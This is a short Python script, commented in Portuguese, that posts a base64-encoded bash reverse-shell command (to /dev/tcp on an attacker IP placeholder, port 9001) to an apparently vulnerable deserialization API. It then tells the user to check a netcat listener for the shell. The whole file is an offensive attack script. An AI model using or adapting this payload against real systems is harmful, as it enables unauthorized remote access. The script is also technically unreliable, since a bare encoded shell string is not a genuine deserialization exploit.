import requests
import urllib3
import json
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Configurações do teste
NF_API_URL = "https://127.0.0.1:8001/api/deserialize" #Exemplo de API vulneravel
TARGET_PARAMETER = "data"
PAYLOAD_COMMAND = "bash -c 'bash -i >& /dev/tcp/[SEU_IP_DE_ATAQUE]/9001 0>&1'"
PAYLOAD_B64 = base64.b64encode(PAYLOAD_COMMAND.encode()).decode('utf-8')

print("[+] Testando Desserialização Insegura...")

payload = {TARGET_PARAMETER: PAYLOAD_B64}

try:
    print("[+] Enviando payload de desserialização malicioso...")
    response = requests.post(NF_API_URL, headers={"Content-Type": "application/json"}, data=json.dumps(payload), verify=False, timeout=5)

    print(f"[*] Resposta da API: {response.status_code}")

    if response.status_code == 500 or response.status_code == 400:
        if "malicious" in response.text.lower() or "exception" in response.text.lower():
            print("[!!!] Possível vulnerabilidade detectada! Verifique seu listener netcat.")

    elif response.status_code == 200:
        print("[+] O servidor respondeu com sucesso. Verifique seu listener (netcat) para uma shell reversa.")

except requests.exceptions.Timeout:
    print("[+] Possível vulnerabilidade de DoS ou SSRF-blind detectada (timeout).")
except requests.exceptions.RequestException as e:
    print(f"[-] Erro de conexão: {e}")